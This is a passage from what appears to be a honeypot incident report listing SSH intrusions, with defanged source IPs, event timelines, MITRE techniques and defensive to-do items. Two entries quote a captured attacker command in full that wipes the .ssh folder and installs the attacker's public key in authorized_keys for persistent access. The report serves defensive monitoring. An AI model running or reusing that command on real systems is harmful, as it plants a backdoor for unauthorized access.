- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d376ea354bf2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 17:15 |
| **Last Seen** | 2026-08-23 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:15:15` | `cowrie.session.connect` |
| `2026-08-23 17:15:15` | `cowrie.client.version` |
| `2026-08-23 17:15:15` | `cowrie.client.kex` |
| `2026-08-23 17:15:16` | `cowrie.login.success` |
| `2026-08-23 17:15:16` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:15:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 17:15:17` | `cowrie.direct-tcpip.data` |
| `2026-08-23 17:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2674e0bba82

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 17:15 |
| **Last Seen** | 2026-08-23 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:15:19` | `cowrie.session.connect` |
| `2026-08-23 17:15:19` | `cowrie.client.version` |
| `2026-08-23 17:15:19` | `cowrie.client.kex` |
| `2026-08-23 17:15:20` | `cowrie.login.success` |
| `2026-08-23 17:15:20` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:15:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 17:15:21` | `cowrie.direct-tcpip.data` |
| `2026-08-23 17:15:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2004be2d3cd

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-08-23 17:18 |
| **Last Seen** | 2026-08-23 17:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:18:23` | `cowrie.session.connect` |
| `2026-08-23 17:18:23` | `cowrie.client.version` |
| `2026-08-23 17:18:23` | `cowrie.client.kex` |
| `2026-08-23 17:18:23` | `cowrie.login.success` |
| `2026-08-23 17:18:24` | `cowrie.session.params` |
| `2026-08-23 17:18:24` | `cowrie.command.input` |
| `2026-08-23 17:18:24` | `cowrie.command.failed` |
| `2026-08-23 17:18:24` | `cowrie.log.closed` |
| `2026-08-23 17:18:24` | `cowrie.session.params` |
| `2026-08-23 17:18:24` | `cowrie.command.input` |
| `2026-08-23 17:18:24` | `cowrie.session.file_download` |
| `2026-08-23 17:18:24` | `cowrie.log.closed` |
| `2026-08-23 17:18:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efd9219f9d1a

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-08-23 17:18 |
| **Last Seen** | 2026-08-23 17:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:18:24` | `cowrie.session.connect` |
| `2026-08-23 17:18:24` | `cowrie.client.version` |
| `2026-08-23 17:18:24` | `cowrie.client.kex` |
| `2026-08-23 17:18:24` | `cowrie.login.success` |
| `2026-08-23 17:18:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca221839325e

| Field | Detail |
|---|---|
| **Source IP** | `50.6.228[.]111` |
| **First Seen** | 2026-08-23 17:18 |
| **Last Seen** | 2026-08-23 17:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:18:24` | `cowrie.session.connect` |
| `2026-08-23 17:18:24` | `cowrie.client.version` |
| `2026-08-23 17:18:24` | `cowrie.client.kex` |
| `2026-08-23 17:18:25` | `cowrie.login.success` |
| `2026-08-23 17:18:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.228[.]111` to AbuseIPDB if not already reported
- [ ] Block `50.6.228[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7974a177020

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 17:24 |
| **Last Seen** | 2026-08-23 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:24:39` | `cowrie.session.connect` |
| `2026-08-23 17:24:39` | `cowrie.client.version` |
| `2026-08-23 17:24:40` | `cowrie.client.kex` |
| `2026-08-23 17:24:41` | `cowrie.login.success` |
| `2026-08-23 17:24:41` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:24:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 17:24:41` | `cowrie.direct-tcpip.data` |
| `2026-08-23 17:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-705100d42aa8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 17:24 |
| **Last Seen** | 2026-08-23 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:24:43` | `cowrie.session.connect` |
| `2026-08-23 17:24:43` | `cowrie.client.version` |
| `2026-08-23 17:24:43` | `cowrie.client.kex` |
| `2026-08-23 17:24:44` | `cowrie.login.success` |
| `2026-08-23 17:24:44` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:24:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 17:24:44` | `cowrie.direct-tcpip.data` |
| `2026-08-23 17:24:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40eee6d78293

| Field | Detail |
|---|---|
| **Source IP** | `112.94.5[.]43` |
| **First Seen** | 2026-08-23 17:25 |
| **Last Seen** | 2026-08-23 17:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:25:16` | `cowrie.session.connect` |
| `2026-08-23 17:25:18` | `cowrie.client.version` |
| `2026-08-23 17:25:18` | `cowrie.client.kex` |
| `2026-08-23 17:25:20` | `cowrie.login.success` |
| `2026-08-23 17:25:20` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.94.5[.]43` to AbuseIPDB if not already reported
- [ ] Block `112.94.5[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f7a2bcb587b

| Field | Detail |
|---|---|
| **Source IP** | `119.152.102[.]54` |
| **First Seen** | 2026-08-23 17:25 |
| **Last Seen** | 2026-08-23 17:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:25:27` | `cowrie.session.connect` |
| `2026-08-23 17:25:27` | `cowrie.client.version` |
| `2026-08-23 17:25:27` | `cowrie.client.kex` |
| `2026-08-23 17:25:29` | `cowrie.login.success` |
| `2026-08-23 17:25:29` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:25:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.152.102[.]54` to AbuseIPDB if not already reported
- [ ] Block `119.152.102[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b804ca4f924c

| Field | Detail |
|---|---|
| **Source IP** | `190.181.25[.]210` |
| **First Seen** | 2026-08-23 17:29 |
| **Last Seen** | 2026-08-23 17:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:29:44` | `cowrie.session.connect` |
| `2026-08-23 17:29:44` | `cowrie.client.version` |
| `2026-08-23 17:29:44` | `cowrie.client.kex` |
| `2026-08-23 17:29:44` | `cowrie.login.success` |
| `2026-08-23 17:29:45` | `cowrie.session.params` |
| `2026-08-23 17:29:45` | `cowrie.command.input` |
| `2026-08-23 17:29:45` | `cowrie.command.failed` |
| `2026-08-23 17:29:45` | `cowrie.log.closed` |
| `2026-08-23 17:29:46` | `cowrie.session.params` |
| `2026-08-23 17:29:46` | `cowrie.command.input` |
| `2026-08-23 17:29:46` | `cowrie.session.file_download` |
| `2026-08-23 17:29:46` | `cowrie.log.closed` |
| `2026-08-23 17:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.25[.]210` to AbuseIPDB if not already reported
- [ ] Block `190.181.25[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb41b829722b

| Field | Detail |
|---|---|
| **Source IP** | `121.178.185[.]141` |
| **First Seen** | 2026-08-23 17:29 |
| **Last Seen** | 2026-08-23 17:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:29:44` | `cowrie.session.connect` |
| `2026-08-23 17:29:45` | `cowrie.client.version` |
| `2026-08-23 17:29:45` | `cowrie.client.kex` |
| `2026-08-23 17:29:48` | `cowrie.login.success` |
| `2026-08-23 17:29:49` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:29:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.178.185[.]141` to AbuseIPDB if not already reported
- [ ] Block `121.178.185[.]141` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24fe4e85decb

| Field | Detail |
|---|---|
| **Source IP** | `190.181.25[.]210` |
| **First Seen** | 2026-08-23 17:29 |
| **Last Seen** | 2026-08-23 17:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:29:46` | `cowrie.session.connect` |
| `2026-08-23 17:29:46` | `cowrie.client.version` |
| `2026-08-23 17:29:46` | `cowrie.client.kex` |
| `2026-08-23 17:29:47` | `cowrie.login.success` |
| `2026-08-23 17:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.25[.]210` to AbuseIPDB if not already reported
- [ ] Block `190.181.25[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3e6f53e2684

| Field | Detail |
|---|---|
| **Source IP** | `190.181.25[.]210` |
| **First Seen** | 2026-08-23 17:29 |
| **Last Seen** | 2026-08-23 17:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:29:47` | `cowrie.session.connect` |
| `2026-08-23 17:29:47` | `cowrie.client.version` |
| `2026-08-23 17:29:47` | `cowrie.client.kex` |
| `2026-08-23 17:29:48` | `cowrie.login.success` |
| `2026-08-23 17:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.25[.]210` to AbuseIPDB if not already reported
- [ ] Block `190.181.25[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f87f2b0ae346

| Field | Detail |
|---|---|
| **Source IP** | `176.204.245[.]251` |
| **First Seen** | 2026-08-23 17:29 |
| **Last Seen** | 2026-08-23 17:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:29:54` | `cowrie.session.connect` |
| `2026-08-23 17:29:55` | `cowrie.client.version` |
| `2026-08-23 17:29:55` | `cowrie.client.kex` |
| `2026-08-23 17:29:57` | `cowrie.login.success` |
| `2026-08-23 17:29:57` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:30:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.204.245[.]251` to AbuseIPDB if not already reported
- [ ] Block `176.204.245[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-834f6dac39ac

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 17:34 |
| **Last Seen** | 2026-08-23 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:34:08` | `cowrie.session.connect` |
| `2026-08-23 17:34:08` | `cowrie.client.version` |
| `2026-08-23 17:34:08` | `cowrie.client.kex` |
| `2026-08-23 17:34:09` | `cowrie.login.success` |
| `2026-08-23 17:34:09` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:34:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 17:34:10` | `cowrie.direct-tcpip.data` |
| `2026-08-23 17:34:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7944d59a3240

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 17:34 |
| **Last Seen** | 2026-08-23 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:34:12` | `cowrie.session.connect` |
| `2026-08-23 17:34:12` | `cowrie.client.version` |
| `2026-08-23 17:34:12` | `cowrie.client.kex` |
| `2026-08-23 17:34:13` | `cowrie.login.success` |
| `2026-08-23 17:34:13` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:34:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 17:34:13` | `cowrie.direct-tcpip.data` |
| `2026-08-23 17:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ef2379facc0

| Field | Detail |
|---|---|
| **Source IP** | `106.13.137[.]17` |
| **First Seen** | 2026-08-23 17:34 |
| **Last Seen** | 2026-08-23 17:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:34:44` | `cowrie.session.connect` |
| `2026-08-23 17:34:45` | `cowrie.client.version` |
| `2026-08-23 17:34:45` | `cowrie.client.kex` |
| `2026-08-23 17:34:46` | `cowrie.login.success` |
| `2026-08-23 17:34:47` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:34:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.137[.]17` to AbuseIPDB if not already reported
- [ ] Block `106.13.137[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b544b3f1001

| Field | Detail |
|---|---|
| **Source IP** | `160.30.39[.]50` |
| **First Seen** | 2026-08-23 17:34 |
| **Last Seen** | 2026-08-23 17:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:34:53` | `cowrie.session.connect` |
| `2026-08-23 17:34:53` | `cowrie.client.version` |
| `2026-08-23 17:34:53` | `cowrie.client.kex` |
| `2026-08-23 17:34:55` | `cowrie.login.success` |
| `2026-08-23 17:34:56` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.30.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `160.30.39[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12831875a0e0

| Field | Detail |
|---|---|
| **Source IP** | `113.108.88[.]121` |
| **First Seen** | 2026-08-23 17:40 |
| **Last Seen** | 2026-08-23 17:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:40:47` | `cowrie.session.connect` |
| `2026-08-23 17:40:48` | `cowrie.client.version` |
| `2026-08-23 17:40:48` | `cowrie.client.kex` |
| `2026-08-23 17:40:55` | `cowrie.login.success` |
| `2026-08-23 17:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.108.88[.]121` to AbuseIPDB if not already reported
- [ ] Block `113.108.88[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95c1f052b322

| Field | Detail |
|---|---|
| **Source IP** | `178.224.53[.]154` |
| **First Seen** | 2026-08-23 17:40 |
| **Last Seen** | 2026-08-23 17:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:40:58` | `cowrie.session.connect` |
| `2026-08-23 17:40:58` | `cowrie.client.version` |
| `2026-08-23 17:40:58` | `cowrie.client.kex` |
| `2026-08-23 17:40:59` | `cowrie.login.success` |
| `2026-08-23 17:40:59` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.224.53[.]154` to AbuseIPDB if not already reported
- [ ] Block `178.224.53[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-507a2792eb3e

| Field | Detail |
|---|---|
| **Source IP** | `122.163.121[.]233` |
| **First Seen** | 2026-08-23 17:41 |
| **Last Seen** | 2026-08-23 17:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:41:00` | `cowrie.session.connect` |
| `2026-08-23 17:41:01` | `cowrie.client.version` |
| `2026-08-23 17:41:01` | `cowrie.client.kex` |
| `2026-08-23 17:41:03` | `cowrie.login.success` |
| `2026-08-23 17:41:04` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.163.121[.]233` to AbuseIPDB if not already reported
- [ ] Block `122.163.121[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bc81ff3b579

| Field | Detail |
|---|---|
| **Source IP** | `111.92.107[.]115` |
| **First Seen** | 2026-08-23 17:41 |
| **Last Seen** | 2026-08-23 17:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:41:04` | `cowrie.session.connect` |
| `2026-08-23 17:41:05` | `cowrie.client.version` |
| `2026-08-23 17:41:05` | `cowrie.client.kex` |
| `2026-08-23 17:41:07` | `cowrie.login.success` |
| `2026-08-23 17:41:08` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:41:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.92.107[.]115` to AbuseIPDB if not already reported
- [ ] Block `111.92.107[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cf4c8ef14a9

| Field | Detail |
|---|---|
| **Source IP** | `187.91.166[.]143` |
| **First Seen** | 2026-08-23 17:42 |
| **Last Seen** | 2026-08-23 17:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 17:42:32` | `cowrie.session.connect` |
| `2026-08-23 17:42:32` | `cowrie.client.version` |
| `2026-08-23 17:42:32` | `cowrie.client.kex` |
| `2026-08-23 17:42:35` | `cowrie.login.success` |
| `2026-08-23 17:42:36` | `cowrie.direct-tcpip.request` |
| `2026-08-23 17:42:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.91.166[.]143` to AbuseIPDB if not already reported
- [ ] Block `187.91.166[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-800068f4b27a

| Field | Detail |
|---|---|
| **Source IP** | `113.200.216[.]246` |
| **First Seen** | 2026-08-23 17:42 |
| **Last Seen** | 2026-08-23 17:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

